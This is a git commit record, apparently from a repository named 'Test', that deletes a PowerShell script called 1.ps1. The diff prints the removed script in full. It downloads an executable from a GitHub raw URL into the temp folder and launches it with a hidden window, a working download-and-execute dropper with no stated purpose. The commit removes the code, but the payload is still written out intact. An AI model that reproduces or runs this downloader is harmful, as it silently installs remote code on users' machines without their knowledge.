03bb7a01369664dd75381a47df6202d7ba682d18
! / socialhate <socialhate@proton.me>
2026-05-22 12:04:57 +0300

    Delete 1.ps1

--- 1.ps1
+++
@@ -1,3 +0,0 @@
-$exePath = "$env:TEMP\1.exe"
-(New-Object Net.WebClient).DownloadFile('https://github.com/socialhate/Test/raw/refs/heads/main/1.exe', $exePath)
-Start-Process -FilePath $exePath -WindowStyle Hidden
